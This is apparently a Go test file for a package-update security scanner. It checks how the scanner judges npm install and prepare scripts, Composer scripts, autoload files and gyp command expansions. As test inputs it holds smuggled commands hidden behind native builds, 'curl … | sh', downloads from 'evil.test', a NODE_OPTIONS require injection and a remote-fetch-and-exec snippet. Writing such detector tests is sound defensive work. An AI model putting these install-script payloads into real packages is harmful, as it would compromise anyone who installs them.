// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package meta

import (
	"strings"
	"testing"

	"github.com/RhythmShahriar/rhythm/kit/cli"

	"github.com/RhythmShahriar/sightread/core"
	"github.com/RhythmShahriar/sightread/core/coretest"
)

func TestInstallScriptWording(t *testing.T) {
	s := subject(core.NPM)
	s.Old.Scripts = map[string]string{"install": "node-gyp rebuild"}
	s.New.Scripts = map[string]string{"install": "node-gyp rebuild && node x.js", "postinstall": "node  setup.js"}
	fs := run(t, installDetector{}, s)
	var got []string
	for _, f := range fs {
		got = append(got, f.Evidence.String()+" @"+f.File)
	}
	want := []string{"install changed: node-gyp rebuild && node x.js @package.json", "postinstall: node setup.js @package.json"}
	if len(got) != 2 || got[0] != want[0] || got[1] != want[1] {
		t.Errorf("findings = %q, want %q", got, want)
	}
}

func TestInstallScriptMasksSecrets(t *testing.T) {
	s := subject(core.NPM)
	tok := coretest.FakeKey("github")
	s.New.Scripts = map[string]string{"postinstall": "curl -H 'Authorization: token " + tok + "' https://x.test"}
	f := only(t, run(t, installDetector{}, s), SigInstallScriptNew)
	if strings.Contains(f.Evidence.String(), tok) {
		t.Errorf("evidence shows the token: %q", f.Evidence)
	}
}

func TestNodeGypAndPrepareGuards(t *testing.T) {
	for script, want := range map[string]bool{
		"node-gyp rebuild":                                                        true,
		"prebuild-install || node-gyp rebuild":                                    true,
		"node-pre-gyp install --fallback-to-build":                                true,
		"cmake-js compile -O build --release":                                     true,
		"node-gyp rebuild && node evil.js":                                        false,
		"node-gyp rebuild $(node evil.js)":                                        false,
		"node-gyp rebuild `curl -s http://x/y`":                                   false,
		"node-gyp rebuild\nnode evil.js":                                          false,
		"node-gyp rebuild\r\nnode evil.js":                                        false,
		"node-gyp rebuild > /tmp/x":                                               false,
		"node-gyp rebuild ${EVIL}":                                                false,
		"node-gyp rebuild node evil.js":                                           false,
		"node-gyp rebuild --x 'a;b'":                                              false,
		"node-gyp-build & node evil.js":                                           false,
		"prebuild-install --download https://evil.test/a.tgz || node-gyp rebuild": false,
		"prebuild-install -d https://evil.test/a.tgz":                             false,
		"prebuild-install --download=evil.test/a.tgz":                             false,
		"node-gyp rebuild --directory=node_modules/.cache/x":                      false,
		"node-gyp rebuild -C other":                                               false,
		"node-gyp rebuild --dist-url=https://evil.test/node":                      false,
		"node-pre-gyp install --fallback-to-build --host=evil.test":               false,
		"prebuild-install --runtime napi || node-gyp rebuild --release":           true,
		"": false,
	} {
		if got := nodeGyp(script); got != want {
			t.Errorf("nodeGyp(%q) = %v", script, got)
		}
	}
	old := &core.Meta{Scripts: map[string]string{"build": "tsc", "dev": "node serve.js", "all": "npm run gen && tsc", "gen": "node gen.js"},
		DevDeps: map[string]string{"rollup": "^4"}}
	cur := &core.Meta{Scripts: map[string]string{"build": "tsc", "dev": "node serve.js", "all": "npm run gen && tsc", "gen": "node gen.js"}}
	changed := &core.Meta{Scripts: map[string]string{"build": "node evil.js", "all": "npm run gen && tsc", "gen": "node evil.js"}}
	for script, want := range map[string]bool{
		"husky":                                true,
		"husky install":                        true,
		"is-ci || husky install":               true,
		"npm run build":                        true,
		"yarn build":                           true,
		"npm run all":                          true,
		"rollup -c && tsc":                     true,
		"node scripts/postinst.js":             false, // node ran before; it runs anything
		"npm run release":                      false,
		"npm build":                            false, // not a script runner in npm
		"yarn add evil-pkg":                    false,
		"curl https://x.test | sh":             false,
		"tsc $(node evil.js)":                  false,
		"tsc `node evil.js`":                   false,
		"tsc > /etc/x":                         false,
		"tsc\nnode evil.js":                    false,
		"NODE_OPTIONS=--require=./evil.js tsc": false,
		"HUSKY=0 husky":                        false,
		"npx NODE_OPTIONS=x tsc":               false,
	} {
		if got := benignPrepare(script, old, cur); got != want {
			t.Errorf("benignPrepare(%q) = %v, want %v", script, got, want)
		}
	}
	// The build script's text changed in the candidate: running it is no
	// longer what the installed version trusted, nor is an unchanged
	// script that runs a changed one.
	for _, script := range []string{"npm run build", "yarn build", "npm run all"} {
		if benignPrepare(script, old, changed) {
			t.Errorf("benignPrepare(%q) with changed scripts = true", script)
		}
	}
}

// TestNativeBuildBypass covers the shapes that once hid a second command
// behind an unchanged native build.
func TestNativeBuildBypass(t *testing.T) {
	for _, nv := range []string{
		"node-gyp rebuild $(node evil.js)",
		"node-gyp rebuild `curl -s http://x/y`",
		"node-gyp rebuild\nnode evil.js",
	} {
		s := subject(core.NPM)
		s.Old.Scripts = map[string]string{"install": "node-gyp rebuild"}
		s.New.Scripts = map[string]string{"install": nv}
		if got := changedInstallScripts(s); len(got) != 1 || got[0] != "install" {
			t.Errorf("changedInstallScripts(%q) = %q", nv, got)
		}
	}
	s := subject(core.NPM)
	s.Old.Scripts = map[string]string{"install": "node-gyp rebuild"}
	s.New.Scripts = map[string]string{"install": "prebuild-install --runtime napi || node-gyp rebuild --release"}
	if got := changedInstallScripts(s); len(got) != 0 {
		t.Errorf("a native build swap fired: %q", got)
	}
}

// TestInstallCodeAnalysed covers the nested run: the file a new
// postinstall runs is analysed and the code detectors report what it
// does, once.
func TestInstallCodeAnalysed(t *testing.T) {
	setup := "require('child_process').exec(require('https').get('https://x.test/p'))\n"
	flow := coretest.Feat(core.FFlow, "remote->child_process", "", 1)
	(&coretest.FakeAnalyzer{ByText: map[string][]core.Feature{setup: {flow}}}).Install(t)

	s := subject(core.NPM)
	s.OldTree = coretest.Tree(map[string]string{"index.js": "1\n", "scripts/setup.js": setup})
	s.NewTree = s.OldTree
	s.Old.Scripts = map[string]string{}
	s.New.Scripts = map[string]string{"postinstall": "node scripts/setup.js"}
	s.OldFeatures, s.NewFeatures = core.NewFeatureSet(), core.NewFeatureSet()
	fs := run(t, installDetector{}, s)
	f := only(t, fs, "remote-fetch-exec")
	if f.File != "scripts/setup.js" || f.Severity != cli.SeverityCritical {
		t.Errorf("finding = %+v", f)
	}

	// The installed version ran the same file at install: nothing new.
	s.Old.Scripts = map[string]string{"preinstall": "node scripts/setup.js"}
	for _, f := range run(t, installDetector{}, s) {
		if f.ID == "remote-fetch-exec" {
			t.Errorf("an install code flow the old version had fired: %+v", f)
		}
	}

	// A new file the main pass already reports is not reported again.
	s.Old.Scripts = map[string]string{}
	f2 := flow
	f2.Ev.Path = "scripts/setup.js"
	s.NewFeatures = coretest.Features(f2)
	for _, f := range run(t, installDetector{}, s) {
		if f.ID == "remote-fetch-exec" {
			t.Errorf("the nested run repeated the main pass: %+v", f)
		}
	}
}

func TestScriptFiles(t *testing.T) {
	tr := coretest.Tree(map[string]string{"a.js": "1", "bin/run.sh": "x", "lib/b.js": "2"})
	got := scriptFiles(`node ./a.js && sh "bin/run.sh"; FOO=lib/b.js node ../x.js /etc/passwd`, tr)
	want := []string{"a.js", "bin/run.sh", "lib/b.js"}
	if len(got) != 3 || got[0] != want[0] || got[1] != want[1] || got[2] != want[2] {
		t.Errorf("scriptFiles = %q, want %q", got, want)
	}
}

func TestComposerWording(t *testing.T) {
	s := subject(core.Composer)
	s.New.Type = "composer-plugin"
	s.New.ComposerScripts = map[string][]string{"post-install-cmd": {"A::run", "@php x.php"}, "test": {"phpunit"}}
	fs := run(t, installDetector{}, s)
	var got []string
	for _, f := range fs {
		got = append(got, f.Evidence.String())
	}
	want := []string{"type changed from library to composer-plugin", "post-install-cmd: A::run && @php x.php"}
	if len(got) != 2 || got[0] != want[0] || got[1] != want[1] {
		t.Errorf("evidence = %q, want %q", got, want)
	}
}

func TestAutoloadLowOnlyForDefinitions(t *testing.T) {
	s := subject(core.Composer)
	s.NewTree = coretest.Tree(map[string]string{"src/h.php": "<?php function a() {}\n"})
	s.New.AutoloadFiles = []string{"./src/h.php"}
	s.NewFeatures = coretest.Features(coretest.Feat(core.FCall, "strtolower", "src/h.php", 1))
	f := only(t, run(t, installDetector{}, s), SigAutoloadFiles)
	if f.Severity != cli.SeverityLow || f.Demoted != "only defines functions" || f.Evidence.String() != "autoload.files: src/h.php" {
		t.Errorf("finding = %s %q %q", f.Severity, f.Demoted, f.Evidence)
	}
	s.NewFeatures = coretest.Features(coretest.Feat(core.FHook, "init", "src/h.php", 1))
	if f := only(t, run(t, installDetector{}, s), SigAutoloadFiles); f.Severity != cli.SeverityMedium {
		t.Errorf("a file that hooks init is %s, want medium", f.Severity)
	}
	s.NewFeatures = &core.FeatureSet{Unanalysed: []core.Unanalysed{{Path: "src/h.php", Reason: "limit"}}}
	if f := only(t, run(t, installDetector{}, s), SigAutoloadFiles); f.Severity != cli.SeverityMedium {
		t.Errorf("an unanalysed file is %s, want medium", f.Severity)
	}
}

func TestGypCommands(t *testing.T) {
	text := "{'cflags': ['<!(node -p require(1))'], 'libs': ['<!@(pkg-config --libs (x))'],\n 'x': '<!open\n'}"
	got := gypCommands(text)
	want := []string{"<!(node -p require(1))", "<!@(pkg-config --libs (x))", "<!open"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("gypCommands = %q, want %q", got, want)
	}
	if gypCommands("{'sources': ['a.cc']}") != nil {
		t.Error("a gyp file without expansions has commands")
	}
}

func FuzzGypCommands(f *testing.F) {
	for _, s := range []string{"", "<!", "<!(", "<!)", "<!(a(b)c)", "<!@(x)\n<!(y", "a <! b"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		for _, c := range gypCommands(s) {
			if !strings.HasPrefix(c, "<!") {
				t.Fatalf("command %q does not start with <!", c)
			}
		}
	})
}
